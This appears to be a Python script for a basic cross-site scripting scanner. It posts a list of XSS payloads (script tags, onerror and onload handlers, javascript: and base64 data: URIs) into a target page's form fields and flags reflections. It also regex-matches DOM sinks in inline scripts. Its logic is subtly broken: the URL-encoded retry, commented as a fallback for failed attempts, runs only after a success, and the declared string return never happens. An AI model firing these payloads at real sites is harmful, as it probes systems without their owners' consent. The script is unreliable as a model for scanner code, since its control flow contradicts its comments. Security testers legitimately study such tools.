from bs4 import BeautifulSoup
from colorama import Fore
import requests
import urllib.parse
import re

payloads = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "javascript:alert('XSS')",
    "data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4="
]

def xss_scan(domain: str) -> str:
    # send a GET request to the URL
    response = requests.get(domain)

    # parse the HTML content using BeautifulSoup
    soup = BeautifulSoup(response.content, "html.parser")

    # find all input fields in the form tag with user input options
    input_fields = soup.find_all("input", {"type": ["text", "password", "email", "number", "search", "user"]})

    # iterate through the input fields and send an XSS payload to each field
    parsed_payloads = []
    for field in input_fields:
        # create a sample XSS payloads
        
        # set the value of the current input field to the XSS payload
        for payload in payloads:
            encoded_payload = urllib.parse.quote_plus(payload)
            field["value"] = payload
            
            # submit the form data using a POST request
            form_data = {}
            for form_field in soup.find_all("input"):
                form_data[form_field.get("name")] = form_field.get("value")
            response = requests.post(domain, data=form_data)
            
            # check the response for signs of successful XSS exploitation
            if payload in response.text:
                print(f'{Fore.MAGENTA}[+] {Fore.CYAN}-{Fore.WHITE} XSS FOUND: {Fore.MAGENTA}{field.get("name")}')

            #if the XSS exploitation was not successful, URL encode the payload and try again
                field["value"] = encoded_payload
                form_data[field.get("name")] = encoded_payload
                response = requests.post(domain, data=form_data)
                
                if encoded_payload in response.text:
                    print(f'{Fore.MAGENTA}[+] {Fore.CYAN}-{Fore.WHITE} XSS FOUND: {Fore.MAGENTA}{field.get("name")}')
    
    scripts = soup.find_all("script")
    # Iterate over all script tags
    for script in scripts:
        if re.search(r"(location|document|window)\.(hash|search|referrer|pathname|name|title|cookie|getElementById|getElementsByClassName|getElementsByTagName|write|writeln|innerHTML|outerHTML|setAttribute|getAttribute)\(", str(script)):
            print(f'{Fore.MAGENTA}[+] {Fore.CYAN}-{Fore.WHITE} Potential DOM XSS: {Fore.MAGENTA}{str(script)}')